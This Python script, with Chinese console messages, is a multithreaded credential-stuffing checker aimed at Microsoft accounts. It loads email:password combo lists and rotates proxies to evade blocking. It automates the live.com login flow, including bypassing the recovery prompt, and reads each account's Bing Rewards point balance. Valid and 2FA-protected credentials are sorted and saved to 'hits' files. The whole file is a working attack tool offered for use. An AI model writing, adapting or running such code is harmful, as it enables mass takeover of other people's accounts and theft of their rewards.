#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import configparser
import os
import random
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import parse_qs, urlparse

import requests
import urllib3
from colorama import Fore, Style, init as colorama_init

colorama_init(autoreset=False)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CONFIG_FILE = "config.ini"
COMBO_FILE = "combo.txt"
BASE_RESULTS_DIR = "results"

file_lock = threading.Lock()

class Config:
    def __init__(self, config_file=CONFIG_FILE):
        self.config = configparser.ConfigParser()
        self.config.read(config_file, encoding='utf-8')
        self._parse()

    def _parse(self):
        self.threads = self._get_int('General', 'threads', 50)
        self.timeout = self._get_int('General', 'timeout', 15)
        self.max_retries = self._get_int('General', 'max_retries', 3)
        self.use_proxy = self._get_bool('Proxy', 'use_proxy', False)
        self.proxy_api = self._get_str('Proxy', 'proxy_api', '')
        self.proxy_refresh_interval = self._get_int('Proxy', 'proxy_refresh_interval', 300)
        self.proxy_ttl = self._get_int('Proxy', 'proxy_ttl', 35)
        self.save_hits = self._get_bool('Output', 'save_hits', True)
        self.save_no_rewards = self._get_bool('Output', 'save_no_rewards', True)
        self.save_bad = self._get_bool('Output', 'save_bad', True)
        self.save_2fa = self._get_bool('Output', 'save_2fa', True)
        self.save_errors = self._get_bool('Output', 'save_errors', True)

    def _get_str(self, section, key, default=''):
        try:
            return self.config.get(section, key)
        except (configparser.NoSectionError, configparser.NoOptionError):
            return default

    def _get_int(self, section, key, default=0):
        try:
            return self.config.getint(section, key)
        except (configparser.NoSectionError, configparser.NoOptionError, ValueError):
            return default

    def _get_bool(self, section, key, default=False):
        try:
            return self.config.getboolean(section, key)
        except (configparser.NoSectionError, configparser.NoOptionError, ValueError):
            return default

config = Config()

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.lock = threading.Lock()
        self.last_fetch_time = 0
        self.failed_proxies = set()

    def fetch_proxies(self):
        if not config.use_proxy or not config.proxy_api:
            return
        current_time = time.time()
        if self.proxies and (current_time - self.last_fetch_time) < config.proxy_refresh_interval:
            return
        with self.lock:
            try:
                resp = requests.get(config.proxy_api, timeout=config.timeout)
                if resp.status_code == 200:
                    lines = resp.text.strip().split('\n')
                    now = time.time()
                    new_proxies = [(line.strip(), now) for line in lines if line.strip()]
                    self.proxies = new_proxies
                    self.last_fetch_time = now
                    self.failed_proxies.clear()
            except Exception:
                pass

    def get_proxy(self):
        if not config.use_proxy:
            return None
        self.fetch_proxies()
        with self.lock:
            current_time = time.time()
            self.proxies = [(p, t) for p, t in self.proxies if current_time - t < config.proxy_ttl]
            available = [(p, t) for p, t in self.proxies if p not in self.failed_proxies]
            if not available:
                self.failed_proxies.clear()
                available = [(p, t) for p, t in self.proxies]
            if not available:
                return None
            proxy_str, _ = random.choice(available)
            return self._format_proxy(proxy_str)

    def mark_failed(self, proxy_dict):
        if not proxy_dict:
            return
        proxy_url = proxy_dict.get('http', '') or proxy_dict.get('https', '')
        proxy_str = proxy_url.split('://')[-1] if '://' in proxy_url else proxy_url
        with self.lock:
            self.failed_proxies.add(proxy_str)

    def _format_proxy(self, proxy_str):
        if '@' in proxy_str:
            return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}
        else:
            return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}

proxy_manager = ProxyManager()

class RewardsAccountChecker:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })

    def _apply_proxy(self):
        if config.use_proxy:
            proxy = proxy_manager.get_proxy()
            if proxy:
                self.session.proxies = proxy
            else:
                self.session.proxies = None

    def _handle_failure(self):
        if config.use_proxy:
            if self.session.proxies:
                proxy_manager.mark_failed(self.session.proxies)
            self._apply_proxy()

    def check(self):
        for attempt in range(config.max_retries):
            self._apply_proxy()
            try:
                auth_url = (
                    "https://login.live.com/oauth20_authorize.srf"
                    "?client_id=00000000402B5328"
                    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                    "&display=touch&response_type=token&locale=en"
                )
                resp = self.session.get(auth_url, timeout=config.timeout)
                text = resp.text

                sfttag_match = re.search(
                    r'value=\\"(.+?)\\"|value="(.+?)"|sFTTag:\'(.+?)\'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"',
                    text, re.S
                )
                sfttag = next((g for g in sfttag_match.groups() if g), None) if sfttag_match else None

                urlpost_match = re.search(
                    r'"urlPost":"(.+?)"|urlPost:\'(.+?)\'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"',
                    text, re.S
                )
                urlpost = next((g for g in urlpost_match.groups() if g), None) if urlpost_match else None
                if urlpost:
                    urlpost = urlpost.replace('&amp;', '&')

                if not urlpost or not sfttag:
                    self._handle_failure()
                    continue

                data = {
                    'login': self.email,
                    'loginfmt': self.email,
                    'passwd': self.password,
                    'PPFT': sfttag,
                }
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                login_resp = self.session.post(
                    urlpost, data=data, headers=headers,
                    allow_redirects=True, timeout=config.timeout
                )

                if '#' in login_resp.url and 'access_token' in login_resp.url:
                    return self._fetch_rewards()

                if 'cancel?mkt=' in login_resp.text:
                    token = self._handle_redirect_challenge(login_resp.text)
                    if token:
                        return self._fetch_rewards()

                if any(x in login_resp.text.lower() for x in [
                    'two-step verification', 'enter code', 'authenticator',
                    'suggestedaction', 'sign in to continue'
                ]):
                    return ('2fa', None)

                if any(x in login_resp.text.lower() for x in [
                    "password is incorrect", "account doesn't exist",
                    "that microsoft account doesn't exist"
                ]):
                    return ('bad', None)

                self._handle_failure()
                time.sleep(1)

            except Exception:
                self._handle_failure()
                if attempt == config.max_retries - 1:
                    return ('error', None)
                time.sleep(2)

        return ('error', None)

    def _handle_redirect_challenge(self, text):
        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', text)
        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', text)
        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', text)
        action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', text)
        if all([ipt, pprid, uaid, action]):
            data = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
            resp = self.session.post(action.group(), data=data, allow_redirects=True, timeout=config.timeout)
            return_url_match = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', resp.text)
            if return_url_match:
                fin = self.session.get(return_url_match.group(), allow_redirects=True, timeout=config.timeout)
                fragment = parse_qs(urlparse(fin.url).fragment)
                return fragment.get('access_token', [None])[0]
        return None

    def _fetch_rewards(self):
        try:
            headers = {'Pragma': 'no-cache', 'Accept': '*/*'}
            resp = self.session.get('https://rewards.bing.com/', headers=headers, timeout=config.timeout)

            if 'action="https://rewards.bing.com/signin-oidc"' in resp.text:
                action_match = re.search(r'action="([^"]+)"', resp.text)
                if action_match:
                    data = {}
                    for m in re.finditer(
                        r'<input type="hidden" name="([^"]+)" id="[^"]+" value="([^"]+)">',
                        resp.text
                    ):
                        data[m.group(1)] = m.group(2)
                    self.session.post(action_match.group(1), data=data, headers=headers, timeout=config.timeout)
                    resp = self.session.get('https://rewards.bing.com/', headers=headers, timeout=config.timeout)

            points_matches = re.findall(r',"availablePoints":(\d+)', resp.text)
            if points_matches:
                points = max(int(p) for p in points_matches)
                return ('hit', points)

            ts = int(time.time() * 1000)
            api_url = f'https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp={ts}'
            api_headers = {
                'Accept': 'application/json',
                'Referer': 'https://www.bing.com/',
                'X-Requested-With': 'XMLHttpRequest',
            }
            api_resp = self.session.get(api_url, headers=api_headers, timeout=config.timeout)
            if api_resp.status_code == 200:
                data = api_resp.json()
                if data.get('userInfo', {}).get('isRewardsUser'):
                    balance = data['userInfo'].get('balance')
                    if balance is not None:
                        return ('hit', int(balance))

            return ('no_rewards', None)

        except Exception:
            return ('error', None)

class ResultWriter:
    _results_dir = None

    @classmethod
    def set_results_dir(cls, dir_path):
        cls._results_dir = dir_path

    @classmethod
    def write(cls, filename, content):
        if not content or cls._results_dir is None:
            return
        with file_lock:
            os.makedirs(cls._results_dir, exist_ok=True)
            filepath = os.path.join(cls._results_dir, filename)
            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(content + '\n')

class Stats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.no_rewards = 0
        self.errors = 0
        self.lock = threading.Lock()

    def update(self, status):
        with self.lock:
            self.checked += 1
            if status == 'hit':
                self.hits += 1
            elif status == 'bad':
                self.bad += 1
            elif status == '2fa':
                self.twofa += 1
            elif status == 'no_rewards':
                self.no_rewards += 1
            elif status == 'error':
                self.errors += 1

    def print_summary(self, elapsed):
        print(f"\n{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'检查完成！':^60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")
        print(f"总耗时: {elapsed:.2f} 秒")
        print(f"总检查: {self.checked}/{self.total}")
        print(f"{Fore.GREEN}Hits: {self.hits}{Style.RESET_ALL}")
        print(f"{Fore.RED}Bad: {self.bad}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}2FA: {self.twofa}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}无 Rewards: {self.no_rewards}{Style.RESET_ALL}")
        print(f"{Fore.LIGHTRED_EX}Errors: {self.errors}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")

def process_account(line, stats: Stats):
    line = line.strip()
    if not line or ':' not in line:
        stats.update('error')
        print(f"{Fore.LIGHTRED_EX}[ERR] 无效格式: {line[:30]}...{Style.RESET_ALL}")
        return
    email, password = line.split(':', 1)
    email = email.strip()
    password = password.strip()
    checker = RewardsAccountChecker(email, password)
    status, points = checker.check()
    stats.update(status)
    base_info = f"{email}:{password}"

    if status == 'hit':
        print(f"{Fore.GREEN}[HIT] {email} - {points} points{Style.RESET_ALL}")
        if config.save_hits:
            ResultWriter.write('hits.txt', f"{base_info} | Points: {points}")
    elif status == 'no_rewards':
        print(f"{Fore.BLUE}[NO]  {email} - 无 Rewards{Style.RESET_ALL}")
        if config.save_no_rewards:
            ResultWriter.write('no_rewards.txt', base_info)
    elif status == 'bad':
        print(f"{Fore.RED}[BAD] {email} - 密码错误/不存在{Style.RESET_ALL}")
        if config.save_bad:
            ResultWriter.write('bad.txt', base_info)
    elif status == '2fa':
        print(f"{Fore.MAGENTA}[2FA] {email} - 需要两步验证{Style.RESET_ALL}")
        if config.save_2fa:
            ResultWriter.write('2fa.txt', base_info)
    elif status == 'error':
        print(f"{Fore.LIGHTRED_EX}[ERR] {email} - 网络错误/未知{Style.RESET_ALL}")
        if config.save_errors:
            ResultWriter.write('errors.txt', base_info)

    checker.session.close()

def main():
    timestamp = datetime.now().strftime('%Y-%m-%d_%H%M%S')
    results_dir = os.path.join(BASE_RESULTS_DIR, timestamp)
    ResultWriter.set_results_dir(results_dir)

    print(f"{Fore.CYAN}Microsoft Rewards 批量查询工具{Style.RESET_ALL}")
    print(f"结果保存目录: {results_dir}")

    if not os.path.exists(COMBO_FILE):
        print(f"{Fore.RED}[!] 未找到账号文件: {COMBO_FILE}{Style.RESET_ALL}")
        return
    with open(COMBO_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        accounts = [line.strip() for line in f if line.strip()]
    total = len(accounts)
    if total == 0:
        print(f"{Fore.RED}[!] 账号文件为空{Style.RESET_ALL}")
        return

    print(f"加载 {total} 个账号，线程数: {config.threads}")
    if config.use_proxy:
        print(f"代理模式: 启用 (TTL={config.proxy_ttl}秒)")
    else:
        print(f"代理模式: 禁用")
    print(f"{Fore.CYAN}{'-' * 60}{Style.RESET_ALL}")

    stats = Stats(total)
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=config.threads) as executor:
        futures = [executor.submit(process_account, acc, stats) for acc in accounts]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass

    elapsed = time.time() - start_time
    stats.print_summary(elapsed)
    print(f"\n结果保存在 '{results_dir}' 目录下")
    input("\n按 Enter 键退出...")

if __name__ == '__main__':
    main()